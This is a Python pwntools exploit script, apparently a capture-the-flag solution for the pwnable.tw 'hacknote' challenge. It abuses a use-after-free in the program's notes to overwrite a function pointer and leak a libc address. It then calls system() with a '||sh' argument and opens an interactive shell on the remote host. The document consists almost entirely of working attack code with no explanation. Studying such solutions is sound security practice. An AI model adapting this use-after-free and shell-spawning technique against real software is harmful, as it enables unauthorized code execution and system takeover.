from pwn import *  
# p=process('./hacknote',env={"LD_PRELOAD":"./libc_32.so.6"}) 
p=remote("chall.pwnable.tw","10102")
context(arch='i386',log_level='debug') 

def add(size,data):  
    p.recvuntil('Your choice ')  
    p.recvuntil(':')  
    p.sendline('1')       
    p.recvuntil('Note size ')  
    p.recvuntil(':')  
    p.sendline(str(size))  
    p.recvuntil('Content ')  
    p.recvuntil(':')  
    p.sendline(data)  
  
def delete(index):  
    p.recvuntil('Your choice ')  
    p.recvuntil(':')  
    p.sendline('2')  
    p.recvuntil('Index ')  
    p.recvuntil(':')  
    p.sendline(str(index))  
  
def show(index):  
    p.recvuntil('Your choice ')  
    p.recvuntil(':')  
    p.sendline('3')  
    p.recvuntil('Index ')  
    p.recvuntil(':')  
    p.sendline(str(index)) 

############################################
#### libc_base #############################
#############################################

add(100,'')
add(100,'')

delete(1)
delete(0)

# gdb.attach(p,"b *0x08048A33\nc")

payload=p32(0x804862b)+p32(0x804A010)

add(8,payload)

show(1)

string=p.recvuntil('Hack')
libc_base=u32(string[:4])-299040
print hex(libc_base)
# print string

e=ELF("./libc_32.so.6")
sys_addr=libc_base+e.symbols['system']
delete(2)
payload=p32(sys_addr)+"||sh"
add(8,payload)
show(1)



p.interactive()